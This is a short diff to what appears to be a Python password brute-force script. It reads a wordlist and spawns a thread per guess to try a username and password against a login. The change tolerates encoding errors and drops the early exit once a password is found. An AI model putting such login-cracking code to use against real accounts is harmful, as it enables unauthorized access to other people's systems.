@@ -44,7 +44,7 @@ def cracking(login):
 
 #reading wordlist file
 def main():
-    with open(wordlists_path) as wordlists:
+    with open(wordlists_path, errors="replace") as wordlists:
         try:
             for passwd in wordlists.readlines():
 
@@ -52,8 +52,6 @@ def main():
                 data = {'username':username, 'password':passwd}
                 t1 = threading.Thread(target=cracking, args=(data,))
                 t1.start()
-                if passwd_found == True:
-                    sys.exit()
         except KeyboardInterrupt:
             print("[+]Quitting... ")
 
